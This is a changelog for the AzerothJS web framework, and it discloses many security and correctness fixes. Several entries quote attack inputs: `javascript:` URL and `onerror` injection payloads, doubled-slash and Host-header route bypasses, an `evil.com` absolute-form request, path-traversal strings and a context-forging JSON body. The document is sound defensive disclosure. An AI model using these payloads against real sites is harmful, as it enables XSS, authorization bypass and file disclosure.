# Changelog

All notable changes to AzerothJS are documented here. The monorepo is versioned in
lockstep: one version covers every `@azerothjs/*` package, the `azerothjs` entry
package, and both editor integrations.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions
follow [Semantic Versioning](https://semver.org).

## [Unreleased]

### Fixed (renderer events)

- **`event.currentTarget` in a compiled component is the element again, not the document.**
  Markup handlers lower to `bindEvent`, which routes bubbling types through one document-level
  listener. The browser sets `currentTarget` to the node whose listener is running - the document -
  and the dispatcher fixed up `this` but never `currentTarget`. Since markup handlers are arrow
  functions, and arrows have no `this`, `currentTarget` is the only way a handler can reach its own
  element, so every one of them received the wrong node.

  It failed loudly on methods the document lacks (`event.currentTarget.setPointerCapture(...)`, the
  standard way to make a drag survive the pointer leaving the element) and silently wherever the
  document happens to have the property, which is the worse half. `h()` was never affected - it
  attaches per-element listeners - so the two render paths disagreed, and a test written with `h()`
  cannot observe the bug. The regression test drives `bindEvent` for that reason.

  `currentTarget` is now defined for the duration of each handler call and the original descriptor
  restored afterwards, so a document-level listener registered by application code still observes
  the document.

### Fixed (control flow)

- **A keyed `<For>` warns in development when a reused row's data went stale.** A row is built once
  from the item it was handed and is not rebuilt while its key is unchanged. A list keyed by id
  whose rows display mutable fields therefore renders the values those fields held when the row
  first appeared, and never updates them - the store is right, the screen is wrong, and nothing is
  logged.

  The reconciliation itself is correct and unchanged; the trap is that reading a field off the item
  the row builder handed you is the natural way to write a row. The warning names the field that
  went stale and both remedies: fold the changing field into the key, or pass a getter and read it
  through a `derived`. It is development-only and folds away in a production build.

### Added (http)

- **`conditional()`, `etagFor()` and `matchesEtag()` - conditional JSON responses.** A polled
  endpoint is the most common thing an API serves and the most wasteful to serve unconditionally.
  These turn "nothing changed" into a bodyless 304, handling comma-separated `If-None-Match` lists,
  `W/` weak validators and `*`.

  `scope` is a REQUIRED option rather than an optional one. An entity-tag computed over the body
  alone means two callers whose rows happen to serialize identically share a validator, and handing
  one of them a 304 serves the other's data out of its cache. Naming what the response varies by
  turns a silent cross-tenant leak into a parameter that cannot be forgotten.

  The existing `matchesEntity` in static file serving is unchanged and stays private: it is
  specialized for files, understanding encoding-suffixed validators and `If-Modified-Since` dates.

### Fixed (logger sinks)

- **A stream handed where the options object belongs now throws instead of writing to stdout.**
  `prettySink` and `ndjsonSink` take `{ stream }`, so a bare stream became the options bag,
  `options.stream` read undefined, and the sink fell back to stdout - leaving the configured file
  empty and every line on the console, with nothing naming the cause. In production that reads as
  "logging is broken" while the evidence of the misconfiguration is the first thing lost.

  TypeScript already rejected the call (a writable has no properties in common with the options
  type), so this is the guard for a JavaScript caller. `prettySink()`, `prettySink({})` and
  `prettySink({ stream })` are unchanged.

### Fixed (contract mount diagnostics)

- **A group-relative handler map mounted against the whole contract now names the mistake.**
  `implement(routes, ...)` keys its result relative to the routes it was passed - the only key
  space a feature file can know - while `mountApi(app, contract, ...)` keys from the contract root.
  Spreading the first into the second compiles and fails at boot, and the old error reported a
  generic "route has no handler", leaving the reader to work out that the two halves of one feature
  count from different places.

  The mount now checks whether the BARE key is present, which is exactly this mismatch and nothing
  else, and says so - naming both ways out, including the `mountApi(app, contract.<group>, ...)`
  call that fixes it. A genuinely missing handler still reports plainly, with no misleading hint.

  Found by building a realistic multi-feature application rather than a demo: the mismatch does not
  appear until a contract has more than one group, which is why no existing project surfaced it.
  The underlying design - two key spaces for one feature - is not addressed here.

### Changed (contract client)

- **The typed client now reports every failure as `ApiError`.** It validates input locally before
  sending - deliberately, since that failure costs no network - but threw `SchemaError` for the
  local case and `ApiError` for a server refusal. One logical failure ("validation failed")
  arrived as two types with different shapes, and only the server one carried `status`/`code`.

  That is why a real application accumulates a dozen copies of
  `err instanceof Error && err.message !== '' ? err.message : 'fallback'`: `instanceof ApiError`
  genuinely does not catch client-side validation, so reaching for the typed error does not work
  and duck-typing is the rational response. **The typed error was unreachable in the exact case it
  was designed for**, which was only visible once a realistic application was built against it.

  Local validation now reports `status: 422` and `code: 'validation-failed'` - the same pair the
  server sends for the same failure - and keeps the form-ready `fields` map that made
  `SchemaError` worth catching. A caller cannot tell where the failure was caught, and no longer
  needs to. **BREAKING** for anyone catching `SchemaError` from a client call; catch `ApiError`.

### Fixed (logger, compiler, public types)

- **A logger name containing a regex character deleted other writers' files.** Folder-mode
  retention interpolated the configured `name` straight into the pattern that decides what
  `unlinkSync` removes, so the name acted as a pattern rather than a literal: `[a-c]` matched
  `a-`, `b-` and `c-`, and the likelier `api.v2` matched `apiXv2`. Reproduced - a sink named
  `[a-c]` pruned two files belonging to unrelated services sharing the directory. Not remotely
  exploitable, since `name` is developer configuration and never request data, but escaping an
  interpolated value costs one call and a name should select its own files and nothing else.

- **Five types were public in effect but not nameable.** Each appears in an exported signature or
  union while the package entry never re-exported it, so a consumer could call the function but
  not write down its parameter or narrow its result: `RouteDecodeError` and
  `StreamMultipartOptions` from `@azerothjs/http`, and `TypeCheckOptions`, `MarkupOutput` and
  `OpaqueStatements` from `@azerothjs/compiler`. `RouteDecodeError` is the member added to
  `RouteResult` earlier in this release, so nobody could narrow the union it joined.

- **The compiler's attribute escaper now matches the runtime's.** It escaped `&` and `"` where the
  runtime escapes `&`, `"`, `<` and `>`. Both are safe inside a quoted value and the compiler's
  only ever sees author-written static markup - but two functions with one name and different
  escape sets is a trap for whoever first routes dynamic content through the wrong one.

### Corrected (performance claims)

- **The "ahead of Fastify on the five-scenario geometric mean (~4%)" claim in [0.9.0-beta.1] does
  not hold and is withdrawn.** Re-measured with the same stated methodology (autocannon, 100
  connections, interleaved same-machine A/B, 3 runs x 8s), `@azerothjs/http` is **~5% behind**
  Fastify on that geomean, reproducibly: -5.5%, -4.1% and -6.2% across three runs, and -4.2% at 50
  connections. The measurement used a rebuilt interleaved A/B harness linked to the local packages,
  persisting a JSON artifact per run (Node version, platform, settings, per-scenario medians and
  every individual run). The original harness sat in an untracked sibling directory and wrote
  nothing at all, so the number outlived its evidence - which is why this went unnoticed for three
  minor versions, and why any future claim needs a stored artifact behind it.

  Three findings that should not be collapsed into each other:

  - **The security work accounts for part of the gap, not all of it.** The same benchmark against
    `8bf1c71` (before both audits) gives ~-2%, so the two security commits cost roughly 3 points.
    The pre-audit code was already behind, so the fixes did not turn a lead into a deficit.
  - **The original claim was measured against 0.8.0-beta.2**, whose handler signature no longer
    exists: its server entry used the two-argument `(request, ctx)` form and imported `serve` from
    the package root. That entry cannot run on 1.1.0 at all, so the old numbers describe a
    materially different framework and were never re-earned across the 1.0 API change.
  - **Run duration changes the sign.** At 2 seconds the same comparison reports azerothjs ~4%
    ahead; at 8 seconds it reports ~5% behind, because a short run never reaches steady state. The
    published figure is close to what a too-short run produces.

  Still unverified against 1.1.0 and NOT re-measured here: the Express/Koa/Nest comparisons in the
  same entry. The js-framework-benchmark and `ws` claims were checked against their stored raw data
  and do hold - but for 0.8.0-beta.2, not for the current release.

- **Measured cost of the security work on the paths it touched.** Three commits compared in one
  process, interleaved, 21 rounds, medians with interquartile bands: SSR render **-8% to -13%**
  (real - the renderer safety gate is the XSS defence that caught two criticals, so the cost is
  accepted, and now documented rather than assumed); HTTP dispatch **-4% to -7%** (borderline, the
  verdict moved between runs); WebSocket frame parsing **+77% to +82%** (a real improvement, from
  the first audit's parser rewrite).

### Security (second adversarial pass: fuzzing, differential testing, editor tooling)

A second audit attacked the framework by RUNNING it rather than reading it: 16 million seeded
fuzz cases against invariance oracles, and behavioural comparison against React, Express,
Fastify, Hono and Koa on identical input. It also opened the packages the first pass never did.
Two things stand out. The fixes from the first pass were themselves the largest unreviewed
surface, and the renderer's safety gate - written in that pass - had the two worst holes found
here. And where a guarantee was judged by a value's declared TYPE rather than by the bytes that
actually get written, the gate could be walked around.

- **Any prop carrying a `javascript:` URL rendered live unless it was a string.** `assertSafeUrl`
  tested `typeof candidate === 'string'`, while both writers end in `String(value)`. A
  one-element array, a `String` object, or anything with a `toString` walked past every URL
  attribute - `href`, `src`, `action`, `formaction`, `poster`, `data`, `xlink:href`. An array is
  the realistic carrier: `?next=javascript:alert(1)&next=x` yields one from every mainstream
  query parser. The string form threw, so the policy was never in doubt, only its reach. The gate
  now judges the coerced value. React neutralizes the same input; AzerothJS was the looser of the
  two, which is what made it a defect rather than a difference.

- **Tag names were never validated, only checked against a refused-name set.** `serializeElement`
  interpolates the name straight into `<...>`, so `h('img src=x onerror=alert(1)', {})` emitted
  that verbatim and the browser parsed the attributes back out. Confirmed executing in Chromium.
  `document.createElement` rejects the same name, so the DOM path failed safe and only SSR
  injected - precisely the server/client split the gate exists to prevent. Tag names now have to
  be tag names, including through `unsafeTag()`, which authorizes a refused TAG and was never
  meant to authorize arbitrary markup.

- **An `on*` prop was skipped case-sensitively but gated case-insensitively.** `ONCLICK` or
  `OnClick` carrying a real handler missed the skip, so the renderer CALLED it to see what it
  returned - running a click handler on the server, once per render - and then reported that an
  `on*` prop must be a function, which it was.

- **`//admin` reached the `/admin` handler.** The router dropped every empty path segment, so
  `//admin`, `/admin//panel` and `/admin/panel//` all resolved to the protected route.
  Differential testing put AzerothJS alone in this: Express, Fastify, Hono and Koa all 404, and
  RFC 3986 6.2.2 does not list empty-segment removal among the normalizations that preserve
  equivalence. Being the permissive outlier is what made it exploitable, in two directions: a
  proxy or WAF rule keyed on `^/admin` does not match `//admin` and forwards it, and an in-app
  guard on `context.url.pathname` - the standard accessor, not the framework-specific
  `context.path` - sees a string that fails `startsWith('/admin')` while the handler still runs.
  Empty segments are no longer collapsed. Trailing-slash equivalence is unchanged; it cannot
  shift a prefix. **This is a breaking routing change**: a client that spells a path with a
  doubled slash now gets a 404.

- **An absolute-form request target was concatenated onto our own authority.**
  `GET http://evil.com/admin HTTP/1.1` became `http://thttp://evil.com/admin`, whose path is
  `//evil.com/admin` and whose host is a fabricated `thttp`. RFC 9112 3.2.2 requires a server to
  accept absolute-form and 3.3 says the target IS the request-target. Three consequences, all
  live: the request routed to the wrong resource, `request.url` was not a legal URL, and
  `context.url.host` reported an authority no client sent, so a host check written on it compared
  against garbage. The path is now taken from the target; the authority deliberately is not,
  because letting the request line choose the origin is worse than the bug.

- **`App.handle` could resolve with something that is not a Response.** Its docblock promises
  that it "cannot throw and cannot reject; every failure becomes an error Response", and its
  signature says `Promise<Response>`. The throw path honoured that; the return path did not. An
  async handler that forgets to `return` on one branch resolved the request with `undefined` -
  the most common handler mistake there is. Nothing rejected, so `onError` never fired and an
  observer recorded a success.

- **The editor tooling had no path containment at all.** A `.azeroth` file in a repository
  someone cloned is untrusted input, and both module resolvers handed
  `path.resolve(dirname(importer), specifier)` straight to the filesystem, with no containment
  check of any kind (the specifier test also admits a root-relative `/...`, which resolves outside
  the workspace; a Windows drive-letter path was never admitted, so `..` is the escape that
  matters). `import x from '../../../../secret.azeroth'` was resolved,
  read, compiled, and its string literals rendered into a hover tooltip; `document-links` probed
  arbitrary paths with `fileExists` and emitted a link only when one existed, which is an
  existence oracle with a clickable `file://` target. The check that was missing is the one
  `@azerothjs/http`'s static handler already applies to a request path, and it is now shared:
  containment on the resolved path, then on what the filesystem really resolved, so an in-tree
  symlink cannot point out of the tree.

- **A 405 advertised an `Allow` set missing a method the server answers.** The router serves HEAD
  off a GET registration, but the set was built from raw handler keys, which never contain HEAD.
  RFC 9110 10.2.1 defines `Allow` as the methods the resource supports; clients act on it.

- **A render could be driven into unbounded recursion from data.** `resolveThunks` bounds its
  unwrap specifically to survive a getter that returns a getter forever, and at the bound returns
  the value still as a function - whereupon `serializeChild` called itself on it, landed back in
  the same branch, and resolved to a function again. The cap was real; its caller undid it. The
  child-array branch had no bound of its own, so an array containing itself did the same. Both
  came out of the render entry point as an uncaught `RangeError`, killing the request.

- **A malformed percent-escape answered 404 where the router's own comment promised 400.** A `%`
  not followed by two hex digits is not a valid URI (RFC 3986 2.1), so the target is malformed
  rather than unknown, and RFC 9110 15.5.1 makes that a 400 - which Express and Fastify both
  return. The router reported it as a routing miss and the app layer turned every miss into a
  404. `RouteResult` gains a `decode-error` kind, which is what the comment described all along.

- **Editor projects and caches grew without bound.** One `ts.LanguageService`, program and lib
  set materializes per nearest-tsconfig directory touched - roughly 48 MB resident each - and the
  only eviction was workspace-folder REMOVAL, which a session never performs. Browsing a
  repository with a few dozen package directories drove the extension host past a gigabyte. The
  same shape existed with no eviction at all in the ESLint project pool and the tsserver plugin's
  compiled-file cache. All three are now bounded, least-recently-used first.

- **`tsconfig.json` discovery walked to the filesystem root.** A config placed ABOVE the folder
  the editor opened was found and obeyed, and a tsconfig is not inert: `files`/`include` pull
  arbitrary `.ts` into the program - whose contents come back quoted verbatim in type errors -
  and `paths` redirects module resolution, so go-to-definition lands wherever the config chose.
  The walk now stops at the opened workspace folder, which is the line Workspace Trust draws.

- **Which frames an application saw before a protocol violation depended on TCP segmentation.**
  `push()` accumulated frames in a local array and threw on reaching the bad one, so everything
  parsed earlier in that call was discarded with the array - while the same bytes arriving in
  separate segments had already been returned and delivered. The peer chooses the segmentation.
  Fuzzing put it at 6,204 of 50,000 cases. No capability is gained by an attacker, since they
  decide whether to send the malformed frame at all, so this is a determinism defect rather than
  an exploit - but it contradicted the rule `socket.ts` already states for `[close][text]`:
  everything up to the terminating event is delivered, nothing after. A frame that completed
  before the violation arrived while the connection was healthy, and is now delivered either way.
  `ProtocolError` carries them on a new `frames` field.

- **`<` and a backtick were missing from the invalid-attribute-name set.** Not exploitable alone -
  a spec tokenizer keeps `a<b` as a single attribute name - but the name is written straight into
  the tag, and a serializer interpolating attacker text should not be the thing deciding which
  delimiters happen not to matter today.

- **The language server's document gate ignored the URI scheme.** `uri.endsWith('.azeroth')`
  admitted `http://evil/x.azeroth`, which then keyed a language service on whatever the path
  conversion made of it. `uriToPath` also applied a single `decodeURIComponent` with no
  normalization afterwards, so `%2e%2e` reached the filesystem as a live `..` - the one point in
  the pipeline where an encoded traversal is visible as one. Both are closed.

### Fixed (templates)

- **Every scaffolded app was born failing its own `azeroth check`.** The shipped ESLint config
  sets `brace-style: allman` and also pulls in `js/recommended`, which carries
  `no-unexpected-multiline` - and Allman puts a multi-line call's opening paren on its own line,
  which that rule reads as two statements. The two cannot both hold. The fullstack template's own
  `createRouter` call tripped it, so `npm run check` failed on a freshly created project before a
  line of user code existed. There is no ASI hazard in the pattern (a parenthesis there can only
  continue the call), so the rule is off and the house style stands. The monorepo's own config had
  the same latent conflict and got the same treatment. Only booting a scaffolded app surfaces
  this: the monorepo's linter ignores `templates/`, and the template specs are not collected by
  the monorepo's test runner.

### Security (http kernel)

An adversarial audit across every package reproduced each of the following against real sockets
and real browsers. The pattern worth naming, because it explains all of them: the kernel's
guarantees held exactly as documented, and nothing OUTSIDE the kernel re-established them.

- **The routed path was built from the client-controlled `Host` header.** `AdapterRequest.url`
  composed `${scheme}://${authority}${target}` from raw `headers.host`, of which only
  `X-Forwarded-Host` was ever validated, and the kernel recovers the path by scanning for the
  first `/` after `://`. A `/`, `?` or `#` inside `Host` therefore moved the authority/path
  boundary: `GET / HTTP/1.1` with `Host: h/admin` executed the `/admin` handler, and
  `GET /admin` with `Host: h?x` executed `/admin` while `context.url.pathname` reported `/`.
  Every layer that reasons about the path disagreed with the router - an ingress or WAF path
  rule saw `/`, an in-app prefix guard saw `/`, and the shipped request logger recorded `/` or,
  for a `Host` that would not parse at all, nothing. `Host` is now validated with the same
  grammar `X-Forwarded-Host` already used, falling back to `localhost`.

- **`context.path` is new, and it is the path to make policy decisions on.** The router matches
  decoded segments, so `/%61dmin` is the route `/admin` - while `url.pathname` preserves the
  client's spelling, so a prefix check written on it could be bypassed by re-spelling the path
  that still reached the protected handler. There was no canonical path available to compare
  against; now there is one. (An empty segment, `//admin`, was in that set when this landed and
  is no longer: see the entry above, which stops the router matching such a path at all.)

- **A single request could kill the process, through five reachable triggers.** `App.handle`
  cannot reject, but the layers around it could, and nothing caught them: the node adapter
  dispatched into a bare `.then()`, `pipeline()` had no error path at all, and no
  `unhandledRejection` handler existed anywhere in the framework, so Node's default policy
  (terminate) applied. Confirmed triggers: a CORS `origin` predicate throwing on the
  `Origin: null` that sandboxed iframes send by themselves; a rate-limit store rejecting, which
  the module's own docs invite by recommending Redis; `writeHead` throwing on an out-of-range
  status or a CRLF in an error header; and `errorResponse` itself throwing from inside
  `handle`'s catch on a `details` payload containing a BigInt or a cycle. `pipeline()` now
  terminates the error path the way `App.handle` does, and the adapter catches whatever still
  escapes, answering 500 before headers are sent and destroying the connection after.

- **The last-resort error path could no longer fail.** `encodeError` guards its own
  `JSON.stringify` and degrades to the envelope, `String(error)` is replaced by a stringifier
  safe for a thrown value with no primitive conversion, and an error's mandated headers are
  normalised through real `Headers` (which rejects CRLF and NUL) with the framing headers
  re-asserted last, so a supplied `content-length` can no longer declare a length the body does
  not have and desynchronise a keep-alive connection.

- **`dev:false` published `HttpError.details` on a 5xx while hiding the message.** `details` now
  follows the message rule: a 4xx still carries it (the 422 validation field map is the
  documented form contract and is unaffected), a 5xx does not. A DSN with credentials and the
  SQL that failed were previously returned to the client on a 500.

- **A response header written the standard way could be silently dropped in production.**
  `PayloadResponse.headers` materialises a detached view, and the adapter wrote only the raw
  record, so `response.headers.set('cache-control', 'no-store')` in middleware was reported by
  `app.handle()` - the entire documented testing story - and never reached the socket. A
  `Set-Cookie` added that way was dropped in production while the test asserting it passed.
  Once the view exists it is now the truth `raw()` reports.

- **Middleware additions can no longer forge the context.** Additions were `Object.assign`ed
  flat, including over the reserved `request`, `params` and `url` keys, so a middleware
  returning parsed request data (`app.use((c) => readJson(c.request))`) let a body of
  `{"params":{"id":"admin"}}` replace the path params a handler authorises on. Reserved keys are
  skipped and only own properties are copied.

- **A registered route could be unreachable with no warning.** The router's backtracking reacted
  only to STRUCTURAL dead ends, so a static terminal holding a different method ended the walk:
  `app.get('/users/me')` made `app.post('/users/:id')` answer 405 for that one id, and a static
  GET shadowed a wildcard POST the same way. The verb is now part of the match, and the 405's
  `Allow` reports every method reachable at that path rather than one terminal's.

- **An aborted streaming request leaked whatever its cleanup owned.** Cleanups were deferred to
  the response body, which runs them from `pull` or `cancel` - but an adapter that finds the
  socket already destroyed dropped the response without reading or cancelling it, so
  `onRequestCleanup` never ran: pooled connections stayed checked out and transactions stayed
  open, which is pool exhaustion under repetition. The request's abort signal now also settles
  the root, and the adapter cancels the body it cannot write.

- **`json()`/`text()`/`html()` at 204, 205 or 304 declared a `Content-Length` with no body**,
  which RFC 9112 section 6.2 forbids and which is the shape a framing desync is built from.

### Security (compiler)

- **A carriage return in any emitted string literal produced INVALID JavaScript, and the Windows
  default checkout triggered it.** The literal escaper handled `\`, `'` and `\n` but not U+000D,
  and a raw CR inside a single-quoted JS literal is a LineTerminator, so the emitted module was a
  syntax error. Five paths delivered one, including `<style>`/`<script>` raw text and static
  attribute values, which means `core.autocrlf=true` (Git for Windows' default) plus any
  multi-line `<style>` failed the build - and the error was misattributed to the author's markup
  rather than the compiler's escaping. U+2028 and U+2029 are now escaped too, and the emitted
  module is validated with a real `node --check` in the regression tests.

- **A whitespace run with no newline made text normalisation quadratic.** Measured 18,263 ms
  through `generateModule` for 160,000 spaces, versus 2.4 ms after. It matters far beyond a build:
  the same normalisation runs in `lintSource` and `generateVirtualCode`, which the language server
  and the ESLint processor execute on every keystroke, so one such file made the editor
  unresponsive. The newline test now happens in JavaScript rather than inside the pattern, so
  there is nothing left to backtrack.

- **`emitDeclarations` wrote generated `.d.ts` files OUTSIDE the Vite root and overwrote existing
  ones.** For any `.azeroth` module resolved outside the root (a monorepo sibling, a linked
  workspace), the relative path began with `..` segments that path joining then normalised away,
  climbing out of the mirror directory and then out of the root. Confirmed destructive: a
  hand-written `Shared.d.ts` outside the root was replaced with generated content. Every write now
  verifies containment first and skips rather than escaping.

- **A static `innerHTML=` or `textContent=` rendered differently in the two modes.** The dynamic
  path checked the DOM-property table and the static path did not, so the value was baked into the
  template string as an inert lowercased attribute in the clone path while the SSR path treated it
  as raw content. One artifact, two different DOMs, and the type check reported nothing. Both
  paths now go through the same property write, including through the constant-folding door, which
  was the same defect by another route.

- Also: character references now decode in a static attribute value as they always did in text
  (`title="Tom &amp; Jerry"` rendered the literal entity before), and the markup depth cap is
  threaded through expression holes in all three walkers, so deeply nested markup raises a LOCATED
  compile error instead of an unhandled `RangeError` out of `generateVirtualCode` - the single
  projection behind the language service, the TS plugin, the ESLint processor and the type checker.

### Security and correctness (CLI, packaging, release)

- **`release.mjs --no-bump` published without verifying the tree, the tag, the version or the
  branch.** The clean-tree check sat inside the bump branch, so a dirty tree published as-is and
  `npm publish` packs the working tree rather than the tag; `--skip-checks` skipped the only step
  that clears `dist/`; the version being published was never cross-checked against any manifest,
  so it could differ from the one the dist-tag moved; and nothing checked the branch, with publish
  happening before push so a missing tag was discovered only after the registry had been mutated.
  Confirmed: a run from a tree with 37 modified files was accepted and would have published all
  fifteen packages at the wrong version, then moved `latest` to a version never published. The
  clean-tree check now covers any publishing run, `--no-bump` asserts the manifest version matches
  and that the tag exists and points at HEAD, and a branch guard with `--allow-branch` covers runs
  that create history. `--skip-checks` while publishing now says out loud that every `dist/` on
  disk ships as-is.

- **The npm OTP was printed once per package, thirty times per release.** The command log included
  the full argv, and npm accepts long-lived reusable RECOVERY codes as well as short-lived TOTP,
  so a pasted log or a CI artifact could hand over publish authority. The code now travels in
  `NPM_CONFIG_OTP` and never appears in an argv, with a redactor left on the logging path as a
  standing guard.

- **`azeroth upgrade` could not run at all on Windows.** It spawned `npm.cmd` with `shell: false`,
  which the CVE-2024-27980 fix refuses on every Node the package supports, so the verb always
  failed and reported it as a registry error. npm is now reached through its entry script with an
  argument array and no shell, matching what every other child spawn in the CLI already did.

- **`azeroth upgrade` also destroyed dependency specifiers it should never have touched.** The pin
  rewrite matched any azeroth-scoped key anywhere in the manifest TEXT and replaced the whole
  value, so `file:`, `workspace:`, `git:` and multi-part ranges were all overwritten with an exact
  version, in `peerDependencies` and `overrides` as well - a library author who ran it then
  published an unsatisfiable peer constraint to every consumer. It now parses the manifest, walks
  only the three dependency sections, rewrites only plain semver pins, and reports what it skipped.

- **`create-azeroth` could scaffold outside the working directory**, including to the drive root,
  because the name pattern allowed `.` and `/`. The name must now be a single npm-shaped package
  segment and the resolved target is asserted to be inside the working directory.

- **Every published tarball shipped sourcemaps whose sources were not in the tarball**, 494 files
  and 1.49 MB of dead weight that actively misdirected stack traces and go-to-definition. Maps are
  excluded from the published files while staying on disk for local development: 1,123 files down
  to 629, and `publint` still passes for all fifteen packages.

- Also: `mountPages` now fails at request time with an error naming `clientDir` and both filenames
  it looked for, instead of killing the process with a bare ENOENT from an unhandled rejection at
  boot; `kit prerender` asserts its output path stays inside the output directory, so a route path
  containing `..` is a build error rather than a write two levels up; `azeroth doctor` no longer
  reports a spawn hazard because a file merely mentions `shell: true` in a comment (it flagged this
  repository's own release script) and now catches a real one in a file with no `spawn(` call; and
  the publish smoke gate checks the `bin` targets of every installed package rather than one,
  which is 6 instead of 3.

### Fixed (CLI and the fullstack template)

- **A freshly scaffolded fullstack app died at boot.** Found by booting a real scaffold rather
  than by any test. The template guarded its devtools call on `config.env === 'development'` - a
  value `loadConfig` DEFAULTS when nothing is set - while `attachDevtools` checks the raw
  `process.env.NODE_ENV`. A scaffold ships no `.env`, so nothing set it: the template's branch was
  true, the bridge it called refused, and the exception took the process down at module scope. The
  two sides were reading different facts about the same thing.

  Fixed on both sides, and neither alone is enough. `azeroth dev` now DECLARES
  `NODE_ENV=development` to its children when nothing has set it, because `dev` is the development
  command and the framework's dev-only gates check that value positively (an unset variable has to
  mean "not development", or a production deploy that forgot it would open them). And the template
  now reads the same raw variable the bridge does, so a bare `node src/main.ts` with no environment
  boots cleanly with the bridge simply not attached. `npm run dev` gets the panel; nothing else
  does. Verified in all three states: unset, `development`, and through the CLI.

### Security (renderer, stricter than React by choice)

Three positions the framework previously shared with React are now tightened, each with an
explicit escape hatch. The framework targets banks, exchanges and payment gateways, where the
cost of an unexpected refusal is a build error and the cost of a permissive default is an
incident.

- **Dangerous URL schemes are refused** on `href`, `src`, `action`, `formaction`, `poster`,
  `xlink:href` and `data`: `javascript:`, `vbscript:`, and any `data:` that is not an image.
  `data:image/svg+xml` stays refused, because SVG carries script. The candidate is normalised
  before its scheme is read, so `java\tscript:` cannot slip past. `srcdoc` is refused outright.
  Ordinary URLs and inline `data:image/png` are untouched, and `unsafeUrl(value)` is the opt-out.
  Applied through the SAME gate on both render paths, because a divergence between them is one of
  the defects this session already fixed. Fixing it surfaced a real parity bug: the serializer
  called the gate with the RAW prop, so a reactive `href={() => evil()}` was checked on the client
  and unchecked on the server.

- **Executable tag names are refused** in `h()`: a `<script>` that would actually run (no `type`,
  or a JavaScript MIME), plus `base`, `object` and `embed`. `iframe` stays allowed, because every
  video and payment embed is one, and so does a data-block `script` such as
  `application/ld+json`, which is a documented pattern with dedicated escaping in the serializer.
  `unsafeTag(name)` is the opt-out. Note this covers `h()`, not static markup: a `<script>` written
  literally in a `.azeroth` file is compiled into a cloned template and never reaches `h()`, which
  is the author writing a script tag deliberately rather than a tag name arriving from data.

- **Hydration strips injected event-handler attributes.** Adoption applied the client's props over
  whatever the server sent and kept the rest, so an `on*` attribute smuggled into the server HTML
  survived onto the live page. The client never legitimately sets an `on*` ATTRIBUTE, so any found
  during adoption is removed. Creation is untouched.

- **A leaving `Transition` or `TransitionGroup` row stops being interactive.** Both kept the
  element in the DOM with its handlers and reactive scope alive for the whole leave animation, up
  to a one second fallback, so a "Confirm payment" button was clickable while it animated away.
  Both now carry one framework-owned attribute and one injected, author-overridable
  `pointer-events: none` rule; no inline style is ever mutated. `TransitionGroup` had the same
  defect as its sibling and was not in the original finding, which is the pattern this whole audit
  kept turning up.

### Security (contract layer, second pass)

- **BREAKING: `only()` returns a wrapper object rather than a branded array.** The brand was a
  value property, so it survived at runtime but was erased by ANY widening annotation - a
  `ReadonlyArray<Guard>` variable, a `GuardMap`-annotated map, a helper's declared return. An
  erased brand meant the mount dropped the inherited chain while the handler stayed typed with the
  additions of guards that never ran, which is exactly the bug `only()` exists to prevent. A
  wrapper is not an array, so that assignment is now a compile error and the two sides cannot
  disagree. Migration: nothing changes at the call site, `only([...])` still reads the same; only
  code that spread or indexed the RESULT needs updating.

- **BREAKING: a guard promises only what it actually attaches.** `guard()` inferred its additions
  from a union that already contained `undefined | void`, so the everyday optional-session guard -
  one with a conditional `return;` - still typed its additions as definitely-present. Every
  handler behind it read `context.accountId` as a `number` while the anonymous path reached it
  with the field absent, which is a latent null dereference on precisely the requests that carried
  no credential. A guard that attaches on every path is now an `ExactGuard` and keeps exact types;
  one that can attach nothing types its additions OPTIONAL and the handler has to narrow.

- **A guard chain's additions are intersected, not unioned.** Two guards on one key both
  `Object.assign` onto the same context, so both fields are present, but the type modelled that as
  "one or the other". Unpinned by any test, and wrong in the direction that lets a handler miss a
  field the chain guarantees.

- **The typed client could execute a DIFFERENT route than the one it was called on.** A `:name`
  path param was percent-encoded and a `*name` wildcard was interpolated RAW, so
  `client.files.read({ params: { path: '../../admin/keys' } })` issued `GET /admin/keys` with the
  client's configured auth headers attached and returned that route's body under the calling
  route's declared type. Wildcard segments are now encoded individually - `/` survives, since a
  wildcard is legitimately multi-segment - and a `.` or `..` segment is refused outright.

- **The typed client followed redirects off-origin.** `redirect` was never set, so the fetch
  default `follow` carried the configured headers (an API key, not just the `Authorization` the
  spec strips) to whatever origin a `Location` named, then resolved with that origin's body typed
  as the route's declared output. It is now `redirect: 'error'`: a contract route never
  legitimately answers with a redirect the typed client should follow.

- **The typed client now checks what it is handed, within a bound.** A 2xx body was returned with
  no schema check and no byte cap, on both the success and the error path, so every consumer
  treated a compromised, proxied or legacy upstream's response as contract-shaped data. Bodies are
  validated against the route's declared schema and read within a 1 MiB default;
  `validateResponses: false` and `maxResponseBytes` are the escape hatches for a server the
  contract does not own.

- **Two contract keys could address one route.** Nothing validated key names, so a group `admin`
  holding `overview` and a top-level key spelled `'admin.overview'` computed the same dotted path:
  one handler served both HTTP routes, `'admin.*'` guards leaked onto the route outside the group,
  and OpenAPI emitted duplicate operation ids. A key containing `.` or `*`, or an empty key, is now
  refused where the contract is DECLARED, so the error names the author's own literal.

- **`merge()` reported a duplicate for a legitimate route key.** It tested `key in out` on a plain
  object, so a route keyed `toString` or `constructor` collided with `Object.prototype` on the
  first group. Same class as the prototype bugs already fixed in the mount.

- **A guard that reads the request body now says so.** Verifying an HMAC over the raw bytes is the
  reason to write such a guard, and it left the stream consumed so the mount's own read failed with
  a locked-stream error surfacing as an opaque 500. The mount now names the cause and the fix.

### Security (OpenAPI export and explorer)

- **The spec and the docs page were public by default, with a third-party CDN script.** Neither
  route had an environment gate, and `viewer` defaulted to Scalar, whose page loads an unpinned,
  SRI-less script from a CDN - onto a page developers open against production data and paste
  bearer tokens into. The default viewer is now the self-contained house explorer, and neither
  route registers under `NODE_ENV=production` unless the app passes `public: true`. A spec
  describes every internal route, its input shape and its constraints; publishing that should be a
  decision, not a default.

- **Component-name collisions silently corrupted the document.** `user.profile`, `user_profile`,
  `user-profile` and `userProfile` all pascal-case to `UserProfile`, and on collision the second
  schema OVERWROTE the first while both `$ref`s pointed at it - so a route was documented with a
  different route's body, and the document stayed valid OpenAPI. Names are now claimed and
  disambiguated deterministically, so rebuilds stay byte-identical.

- **The explorer died on any contract containing a multipart route**, because it dereferenced
  `content['application/json']` unconditionally while the exporter emits only
  `multipart/form-data`. The throw escaped after the pane was already cleared, so the page was left
  blank, and if the multipart operation came first the page never booted at all. It now reads the
  first declared media type, the way its own responses loop always did, and offers a JSON editor
  only for a JSON body. A reused multipart spec also no longer emits an orphan component.

### Fixed (http kernel, second pass)

